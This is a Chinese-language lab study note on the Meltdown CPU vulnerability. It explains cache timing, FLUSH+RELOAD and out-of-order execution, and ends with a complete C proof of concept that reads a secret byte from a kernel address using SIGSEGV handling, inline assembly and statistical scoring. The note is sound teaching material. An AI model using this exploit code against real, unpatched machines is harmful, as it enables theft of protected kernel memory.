---
hide:
  #- navigation # 显示右
  #- toc #显示左
  - footer
  - feedback
comments: true
---  

# Meltdown Attack

## 概要

!!! Abstract

	Meltdown 在 2017 年被发现并在 2018 年初被公之于众，其利用了现代 CPU（包括Intel 和 ARM 的 CPU）中存在的严重漏洞。这些漏洞允许用户级的程序读取内核内存中的数据。

## 通过 CPU 缓存进行侧信道攻击

> Meltdown 攻击将 CPU 缓存作为侧信道来窃取受保护的机密。这种侧信道技术称为 FLUSH+RELOAD。
***
### CPU 缓存

CPU 缓存是一种硬件缓存，用于计算机中的 CPU 以减少访问主内存数据的平均成本（时间或耗
能）。从主内存访问数据要比从缓存中快得多。当数据从主内存读取时，它们通常会被 CPU 缓存，因
此如果再次使用相同的数据，访问速度将变得更快。因此，当 CPU 需要访问某些数据时，它会先查看
其缓存。如果数据在缓存中（这被称为缓存命中），则它会被直接获取；如果没有找到数据（这被称为
未命中），CPU 将去主内存获取数据。后者的花费时间明显更长。(相关详细课程笔记可见 [计算机组成](https://brucejqs.github.io/MyNotebook/blog/Computer%20Science/Computer%20Organization/Chapter%205/#the-basics-of-cache))

![](../../../../../assets/Pasted%20image%2020241129141154.png)

!!! example "从缓存/内存读取数据速度比较"

	```c title="CacheTime.c"
	#include <emmintrin.h>
	#include <x86intrin.h>
	
	uint8_t array[10*4096];
	
	int main(int argc, const char **argv) {
		int junk=0;
		register uint64_t time1, time2;
		volatile uint8_t *addr;
		int i;
		
		// 初始化数组
		for(i=0; i<10; i++) array[i*4096]=1;
		
		// 将数组从 CPU 缓存中清除
		for(i=0; i<10; i++) _mm_clflush(&array[i*4096]);
		
		// 访问数组中的某些元素
		array[3*4096] = 100;
		array[7*4096] = 200;
		for(i=0; i<10; i++) {
			addr = &array[i*4096];
			time1 = __rdtscp(&junk);
			junk = *addr;
			time2 = __rdtscp(&junk) - time1; 
			printf("访问 array[%d*4096] 的时间：%d 个 CPU 周期\n",i, (int)time2);
		}
		return 0;
	}
	```
	
	用 `gcc -march=native CacheTime.c` 编译并运行上面的代码，我们首先访问了数组的 `array[3*4096]` 和 `array[7*4096]`，然后查看访问数组 `array[k*4096]`（$k=0,1,2,...,9$）需要的时间，可以发现 `array[3*4096]` 和 `array[7*4096]` 比其他元素访问时间更短，这是因为他们提前被访问过，已经放入了 CPU 的缓存。
***
### 侧信道攻击

根据上面的例子我们可以知道，根据访问速度的不同我们可以得知哪些元素被 CPU 缓存了，那么我们就可以利用这个性质，将这个信息作为侧信道发起攻击。

![](../../../../../assets/Pasted%20image%2020241129143001.png)

假设存在一个函数（我们称其为受害者函数），它使用秘密值（无法从外部访问）作为索引来获取数组中的某些值。我们将用 FLUSH+RELOAD 技术来获取这个秘密值，该技术包含了以下三个步骤：

- FLUSH：将整个数组从缓存当中清除，确保数组没有被缓存
- 调用受害者函数，该函数根据秘密值访问数组中的一个元素，那么对应的数组元素将被缓存
- RELOAD：重新加载整个数组并测量加载每个元素所需要的时间，如果某个元素的加载时间比较快，则这个元素很可能就是受害者函数访问的那个元素，我们就可以确定秘密值

```c title="FlushReload.c"
#include <emmintrin.h>
#include <x86intrin.h>

uint8_t array[256*4096];
int temp;
unsigned char secret = 94;

/* 设置缓存命中时间阈值*/
#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024

void flushSideChannel()
{
	int i;
	
	// 将数据写入数组，并将其存到 RAM 当中以避免写时复制
	for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;
	
	// 清除缓存中的数组值
	for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 +DELTA]);
}

void victim()
{
	temp = array[secret*4096 + DELTA];
}

void reloadSideChannel()
{
	int junk=0;
	register uint64_t time1, time2;
	volatile uint8_t *addr;
	int i;
	for(i = 0; i < 256; i++){
		addr = &array[i*4096 + DELTA];
		time1 = __rdtscp(&junk);
		junk = *addr;
		time2 = __rdtscp(&junk) - time1;
		if (time2 <= CACHE_HIT_THRESHOLD){
			printf("array[%d*4096 + %d] 在缓存中。\n", i, DELTA);
			printf("秘密值= %d。\n",i);
		}
	}
}
```

以上是简单的根据访问时间寻找秘密值的程序，这里为了能更加准确地确认秘密值，设置了一个 `CACHE_HIT_THRESHOLD` 阈值来区分是否在缓存中。
***
## 乱序执行

内存隔离是系统安全的基础。在大多数操作系统中，用户态程序不能直接访问内核空间的内存。这
种隔离通过处理器中的超级用户位实现，超级用户位定义了是否可以访问内核的内存页。当 CPU 进入
内核空间时会设置超级用户位，在退出到用户态时会清除此位。有了这个功能，内核内存可以安全
地映射到每个进程的地址空间中，因此当用户级程序进入内核时，页表不需要更改。

!!! example "Example"

	```c title="Example.c"
	number = 0;
	kernel_address = (char*)0xfb61b000;
	kernel_data = *kernel_address;
	number = number + kernel_data;
	```
	
	假设地址 `0xfb61b000` 是属于内核的地址，那么理论上上述程序第 3 行将引发异常，程序会进行判断内存访问是否合法，发现不合法就中断程序，第 4 行永远不会被执行，变量 `number`的值仍然为 0

上面的 Example 的描述似乎从 CPU 外部角度来看非常正确，但是我们深入 CPU 内部并从微架构级别来看，会发现第 3 行将成功读取内核数据，且第 4 行及后续指令也有可能会被执行，这是因为 CPU 采用的优化技术——乱序执行。

!!! note "乱序执行"

	与严格按顺序执行不同的是，现代高效率的 CPU 允许进行乱序执行以充分利用所有执行单元。按照顺序依次执行指令可能会导致性能较差和资源使用率低，因为当前指令在等待前一个指令完成时，有些执行单元会是空闲的。乱序执行即为，只要所需资源可用，CPU 可以在适当的时候提前执行后面的指令。（其实就是 CPU Pipeline 不断疯狂进行改进的结果）

在上面的代码示例中，从微架构里看，第 3 行涉及两个操作：加载数据（通常存入寄存器）以及检
查该访问是否被允许。如果数据已经存在于 CPU 缓存中，则第一个操作会很快完成，而第二个操作可
能需要一段时间。为了避免等待，CPU 将继续执行第 4 行及后续指令，在这些指令的执行过程中并行
地进行访问检查。这就是乱序执行。在访问检查完成之前，CPU 不会停止工作。在我们的例子里，
检查会失败，因此所有由乱序执行导致的结果都会被丢弃，就好像它们从未发生过一样。这就是为什么
从外部我们是看不到第 4 行被执行了的。

![](../../../../../assets/Pasted%20image%2020241129182201.png)
***
## Meltdown 攻击

Intel 和其他几家 CPU 制造商在设计乱序执行时犯了一个严重的错误：如果提前执行的指令被发现不应该被执行，那么 CPU 应该将这些指令的执行痕迹抹去。CPU 的确是抹去了指令对内存和寄存器的影响，但忘记了抹去在缓存上留下的痕迹。在进行乱序执行期间，引用的内存被加载到寄存器中并也被存储到了缓存中。如果这些乱序执行必须被丢弃，那么由这些执行导致的缓存也应该被清空。不幸的是，在大多数 CPU 中并非如此。因此这就留下了一个可观测的痕迹，使得 Meltdown 漏洞得以完成攻击。

乱序执行为我们提供了从内核内存读取数据的机会，然后我们可以利用这些数据进行一些操作，从而在 CPU 缓存中产生可观测的痕迹。利用 CPU 缓存进行侧信道攻击，我们便可以观测到那个可观测的痕迹，从而可以得到内核内存中的秘密值，这便是 Meltdown 攻击。CPU 在完成访问检查之前能进行多久的乱序执行取决于访问检查的速度有多慢。这是一个典型的竞态条件情况，涉及乱序执行与访问检查之间的竞争。乱序执行越快，我们能够执行的指令就越多，从而更有可能创建一个可以帮助我们获取秘密的可观测痕迹。

乱序执行的第一步包括将内核数据加载到寄存器中，并同时执行访问的安全检查。如果数据加载比安全检查慢，则当安全检查完成时，内核数据可能还在从内存传输至寄存器的过程中，这时乱序执行会因为访问检查失败被立即中断，Meltdown 攻击也会随之失败。以下是示例代码：

```c title="MeltdownExperiment.c"
void meltdown(unsigned long kernel_data_addr)
{
	char kernel_data = 0;
	
	// 下面的语句将引发异常
	kernel_data = *(char*)kernel_data_addr;
	array[7 * 4096 + DELTA] += 1;
}

// 信号处理器
static sigjmp_buf jbuf;
static void catch_segv() { siglongjmp(jbuf, 1); }

int main()
{
	// 设置一个信号处理程序
	signal(SIGSEGV, catch_segv);

	// 将待探测数组的缓存清除
	flushSideChannel();
	if (sigsetjmp(jbuf, 1) == 0) {
		meltdown(0xfb61b000);
	}
	
	else {
		printf("Memory access violation!\n");
	}

	// 再次加载待探测数组
	reloadSideChannel();
	return 0;
}
```
***
### 优化手段

#### 将内核数据提前缓存

如果内核数据已经在 CPU 缓存中，那么将内核数据加载到寄存器中的操作会更快，我们可能会在安全检查完成之前就执行了关键的指令——用于读取数组的那一条指令。如果一个内核数据项未被缓存，使用 Meltdown 来窃取该数据将是非常困难的。所以我们可以让用户程序调用内核模块中的一个函数。这个函数将访问秘密数据但不会将其泄露给用户程序。这一访问的效果仅仅只是让该秘密数据放入 CPU 缓存中。
***
#### 汇编代码引发 Meltdown

即使内核数据已经在 CPU 缓存当中，我们仍然可能没法实现 Meltdown 攻击。

根据[相关研究](https://github.com/paboldin/meltdown-exploit/issues/33)我们可以在引发异常之前添加一些汇编代码（这些汇编代码没有任何作用，单纯就只是执行），这样能提升我们获得秘密值的概率（诡异至极），我们将 `meltdown()` 函数替换成如下 `meltdown_asm()` 函数：

```c title="meltdown_asm.c"
void meltdown_asm(unsigned long kernel_data_addr)
{
	char kernel_data = 0;
	// 给eax 寄存器提供一些事情做
	asm volatile(
		".rept 400;"
		"add $0x141, %%eax;"
		".endr;"
		:
		:
		: "eax"
	);
	
	// 以下语句将引发一个异常
	kernel_data = *(char*)kernel_data_addr;
	array[kernel_data * 4096 + DELTA] += 1;
}
```
***
#### 统计学方法

为了提高准确性，我们可以使用统计技术。基本思想是创建一个大小为 256 的 `score` 数组，每个可能的秘密值对应一个元素。然后我们多次运行攻击程序。每次，如果我们的攻击程序认为 k 是秘密值（这可能是错误的），我们就将 1 加到 `scores[k]` 中。在多次运行后，我们可以使用具有最高分数的 k 作为最终估计的秘密值。这种方法会比单次运行得到的结果更加可靠。修改后的代码如下所示：

```c title="MeltdownAttack.c"
static int scores[256];
void reloadSideChannelImproved()
{
	int i;
	volatile uint8_t *addr;
	register uint64_t time1, time2;
	int junk = 0;
	for (i = 0; i < 256; i++) {
		addr = &array[i * 4096 + DELTA];
		time1 = __rdtscp(&junk);
		junk = *addr;
		time2 = __rdtscp(&junk) - time1;
		if (time2 <= CACHE_HIT_THRESHOLD)
			scores[i]++; /* 如果是缓存命中，则该值加 1 */
	}
}
// 信号处理器
static sigjmp_buf jbuf;
static void catch_segv() { siglongjmp(jbuf, 1); }
int main()
{
	int i, j, ret = 0;
	// 设置信号处理程序
	signal(SIGSEGV, catch_segv);
	int fd = open("/proc/secret_data", O_RDONLY);
	if (fd < 0) {
		perror("open");
		return -1;
	}
	memset(scores, 0, sizeof(scores));
	flushSideChannel();
	
	// 在同一地址上重试 1000 次
	for (i = 0; i < 1000; i++) {
		ret = pread(fd, NULL, 0, 0);
		if (ret < 0) {
			perror("pread");
			break;
		}
		// 将待探测数组缓的缓存清除
		for (j = 0; j < 256; j++)
			_mm_clflush(&array[j * 4096 + DELTA]);
			if (sigsetjmp(jbuf, 1) == 0) { meltdown_asm(0xfb61b000); }
			reloadSideChannelImproved();
	}
	// 找出得分最高的索引
	int max = 0;
	for (i = 0; i < 256; i++) {
		if (scores[max] < scores[i]) max = i;
	}
	printf("The secret value is %d %c\n", max, max);
	printf("The number of hits is %d\n", scores[max]);
	return 0;
}
```

